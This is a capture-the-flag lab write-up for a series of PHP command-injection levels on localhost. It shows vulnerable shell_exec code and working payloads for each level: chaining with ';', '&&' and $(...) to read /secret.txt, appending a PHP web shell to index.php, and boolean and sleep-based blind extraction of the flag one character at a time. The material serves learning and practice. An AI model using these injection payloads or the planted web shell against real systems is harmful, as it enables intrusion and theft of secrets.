@@ -1,0 +1,413 @@
+
+
+ [-Prerequisites-]
+	
+	
+			You can execute more than one command in terminal
+			
+	[Terminal]
+				----------------------
+				hsw@hsw:~$ whoami; pwd
+				hsw
+				/home/hsw
+				----------------------
+			
+		    =>  The ";" is used for separating 2 command (no matter is the previous command executing)
+		
+	[Terminal]
+	
+				-----------------------
+				hsw@hsw:~$ abcxyz; pwd
+				abcxyz: command not found
+				/home/hsw				
+				-----------------------
+	
+	
+ [-Exploitation-]
+ 
+	
+		      
+		      ---------------level 1----------------
+		      |                                    |
+		      |          localhost:3001            |
+		      |                                    |
+		      --------------------------------------
+		      
+	[index.php]
+	
+				<?php
+				    if(isset($_POST['command'],$_POST['target'])){
+					$command = $_POST['command'];
+					$target = $_POST['target'];
+						switch($command) {
+							case "ping":
+								$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
+								break;
+							case "nslookup":
+								$result = shell_exec("timeout 10 nslookup $target 2>&1");
+								break;	
+							case "dig":
+								$result = shell_exec("timeout 10 dig $target 2>&1");
+								break;
+						}
+						die($result);
+				    }
+			    
+				 ----------------------------------------------------------------------------------
+			 
+			 [!] The vulnerable part is the shell_exec() function, which execute a command inside them
+
+			
+	[Dockerfile]
+	
+	
+				--------------------------		
+		 		...
+				.....
+				WORKDIR /var/www/html/
+				COPY ./src .
+				COPY flag.txt /secret.txt         // So secret.txt inside the "/" directory
+				# config permission
+				...
+				......
+				---------------------------
+							
+	
+	[http://localhost:3001]
+	
+				-------------------------------------
+				ping: not.exists.com; cat /secret.txt
+				CBJS{FAKE_FLAG_FAKE_FLAG}
+				-------------------------------------
+			
+			=> Exploited!
+			
+			
+			
+		      ---------------level 2----------------
+		      |                                    |
+		      |          localhost:3002            |
+		      |                                    |
+		      --------------------------------------
+		      
+		      
+	[index.php]
+	
+				?php
+				    if(isset($_POST['command'],$_POST['target'])){
+					$command = $_POST['command'];
+					$target = $_POST['target'];
+					if (strpos($target, ";") !== false) 
+					die("Hacker detected!");
+					    ...
+					    .....
+						
+		      
+		      => Now the strpos() function sanitize the input, if have ":" then "Hack detected"
+		      [!] Beside the ";", we still have other way to execute more than one command in one line 
+		      
+		    
+	[Terminal]
+				----------------------
+				hsw@hsw:~$ whoami && pwd
+				hsw
+				/home/hsw
+				-----------------------
+			
+			But the different between ":" and "&&" is if we use "&&", the first command need to be executed successfully then the second one could be execute
+			
+			
+				----------------------
+				hsw@hsw:~$ abcxyz && pwd
+				abcxyz: command not found
+				-----------------------
+				
+			=> Then the not.exists.com cannot be used here
+			
+			
+	[http://localhost:3002]
+	
+				-------------------------------------
+				PING google.com (142.250.204.142): 56 data bytes
+				64 bytes from 142.250.204.142: icmp_seq=0 ttl=254 time=48.697 ms
+				64 bytes from 142.250.204.142: icmp_seq=1 ttl=254 time=45.111 ms
+				64 bytes from 142.250.204.142: icmp_seq=2 ttl=254 time=43.386 ms
+				64 bytes from 142.250.204.142: icmp_seq=3 ttl=254 time=52.729 ms
+				--- google.com ping statistics ---
+				4 packets transmitted, 4 packets received, 0% packet loss
+				round-trip min/avg/max/stddev = 43.386/47.481/52.729/3.585 ms
+				CBJS{FAKE_FLAG_FAKE_FLAG}                                                  // BOOOM
+				-------------------------------------
+				
+			=> EXPLOITED!
+			
+			
+				
+				
+		      ---------------level 3----------------
+		      |                                    |
+		      |          localhost:3003            |
+		      |                                    |
+		      --------------------------------------
+		      
+	[index.php]
+	
+				-------------------------------------------------
+				<?php
+				    if(isset($_POST['command'],$_POST['target'])){
+					$command = $_POST['command'];
+					$target = $_POST['target'];
+					if (strpos($target, ";") !== false) 
+					    die("Hacker detected!");
+					if (strpos($target, "&") !== false) 
+					    die("Hacker detected!");
+					if (strpos($target, "|") !== false) 
+					    die("Hacker detected!");
+					...
+					....
+				    }
+				---------------------------------------------------
+				
+			=> SO, you see that all character can create a new command is disabled, but we dont need to create a new command.
+			
+			[!] Instead, we can execute a command inside another command by using "echo"
+			
+			
+	[Terminal]
+	
+				------------------------------------------------
+				hsw@hsw:~$ nslookup echo $(pwd)
+				nslookup: couldn't get address for '/home/hsw': not found
+				------------------------------------------------
+				
+	[http://localhost:3003]
+	
+				------------------------------------------------
+				nslookup echo $(cat /secret.txt)
+				nslookup: couldn't get address for 'CBJS{FAKE_FLAG_FAKE_FLAG}': not found     //BOOMMM
+				---------------------------------------------------------
+	
+	
+			=> EXPLOITED!
+			
+			
+			
+		      ---------------level 4----------------
+		      |                                    |
+		      |          localhost:3004            |
+		      |                                    |
+		      --------------------------------------
+		      
+			
+	[index.php]
+	
+				------------------------------------------------
+				<?php
+				    if(isset($_POST['command'],$_POST['target'])){
+					$command = $_POST['command'];
+					$target = $_POST['target'];
+					switch($command) {
+							case "backup":
+								$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
+						if ($result !== null && strpos($result, "zip error") === false)
+						    die("Backup thành công");
+						else
+						    die("Backup không thành công");
+								break;
+					}
+				----------------------------------------------------
+				
+				
+			This time is little bit tricky, but the mindset is not changed
+			[!] You can see that the output is only "Backup thành công" or "Backup không thành công"
+		 	=> SO we exploit by the only way that returns the output
+		 	
+		 	timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1
+		 	
+		 	[!] This command zips the index.php and put to the /tmp directory. Anything comes to your mind???
+		 	=> Yes, we do the same method so our output file is named by the flag
+		 	
+		 	
+	[http://localhost:3004]
+	
+				--------------------------
+				backup: $(cat /secret.txt)
+				Backup thành công
+				---------------------------
+			
+			=> Now we have a file zip named by the flag, but how to see its name?
+			
+			Notable that: "$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");"
+			
+			[!] Yes, we totally can use ";" here (there are no sanitizing the input)
+			=> We are at the whitelab, so at least we have info that at /var/www/html contain backend "index.php". So im gonna add a line to see "flag"
+			
+			=> Our payload: ;echo "<?php echo(shell_exec('cd /tmp; ls')); ?>" >> index.php;
+			
+	[http://localhost:3004]
+	
+				-----------------------------------------------------------------------
+				backup:  ;echo "<?php echo(shell_exec('cd /tmp; ls')); ?>" >> index.php;
+				Backup không thành công
+				
+				CBJS{FAKE_FLAG_FAKE_FLAG}.zip test.zip
+				-----------------------------------------------------------------------
+				
+				
+			Because of the output of "timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1" is no file zip created
+			=> "Backup không thành công" but our payload still works
+			
+			=> EXPLOITED!
+			
+			
+			
+		      ---------------level 5----------------
+		      |                                    |
+		      |          localhost:3005            |
+		      |                                    |
+		      --------------------------------------
+		      
+		      I dont know the purpose of CBJS when adding nginx.conf and modify the Dockerfile: "RUN chmod g+w /var/www/html/"
+		      But my previous method still works at this level
+		      Because it writes itself so we dont need write permission for groups
+		      
+		      
+	[http://localhost:3005]
+	
+				--------------------------
+				backup: $(cat /secret.txt)
+				Backup thành công
+				---------------------------
+			
+			
+			
+				-----------------------------------------------------------------------
+				backup:  ;echo "<?php echo(shell_exec('cd /tmp; ls')); ?>" >> index.php;
+				Backup không thành công
+				
+				CBJS{FAKE_FLAG_FAKE_FLAG}.zip test.zip
+				-----------------------------------------------------------------------
+			
+		=> EXPLOITED!
+		
+		
+			
+		      ---------------level 6----------------
+		      |                                    |
+		      |          localhost:3006            |
+		      |                                    |
+		      --------------------------------------
+		      
+	[docker-compose.yml]
+	
+				----------------------------------
+				..
+				....
+				.....
+				 volumes: 
+				      # using :ro to prevent write file, dont remove this :(
+				      - ./level6/src/:/var/www/html/:ro
+		      		.......
+		      		--------------------------------------
+		      		
+		      	The fun begins, we cant write index.php anymore :(
+	[nginx.conf]
+	
+				----------------------------------
+				server {
+				    listen 80 default_server;
+				    listen [::]:80 default_server;
+				    server_name _;
+				    server_tokens off;
+
+				    location / {
+					proxy_pass http://level06;
+				    }
+				}
+		      		----------------------------------
+		      		
+		      		
+		      		
+		         The nginx.conf create a proxy that pass the request to the backend	
+		         You can see that Dockerfile dont have write permission for group
+		      [!] But we still can execute command!
+		         
+		      => This time we gonna guess to extract every single character in the flag
+		        
+		        
+	[http://localhost:3006]
+				
+				---------------------------------------
+				backup: test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "C" ]; then echo ""; else echo "zip error"; fi ; #
+		SUCCESS:		
+				Backup thành công
+				----------------------------------------
+				
+				
+				----------------------------------------
+				backup: test.zip -r /var/www/html/index.php 2>&1; if [ "$(cat /secret.txt | cut -c 1)" = "B" ]; then echo ""; else echo "zip error"; fi ; #
+		FAILED:		
+				Backup không thành công
+				----------------------------------------
+				
+			=> So the payload means, if we guess successful => echo "" then the screens will output "Backup thành công"
+						 if not                 => echo "zip error" (then the index.php will handle "strpos($result, "zip error") == true") => "Backup không thành công"
+						 
+						 
+						 
+			=> So we should use Intruder mode of BurpSuite to handle the flag
+			
+			
+			=> EXPLOITED!
+			
+			
+			
+		      ---------------level 7----------------
+		      |                                    |
+		      |          localhost:3007            |
+		      |                                    |
+		      --------------------------------------
+		      
+		      This time i use sleep trick to guess every single character
+		      
+	[http://localhost:3007]
+				
+				---------------------------------------
+				backup: ;if [ "$(cat /secret.txt | cut -c 1)" = 'C' ]; then sleep 5 ;fi;
+			
+	After 5 seconds:	Đã chạy câu lệnh backup
+				----------------------------------------	      
+		      
+		      		
+		      => FLAG: CBJS{FAKE_FLAG_FAKE_FLAG}
+	
+				
+		
+			
+			
+			
+	
+		 	
+		 	
+		 	
+		 	
+		 	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+		      
+		      
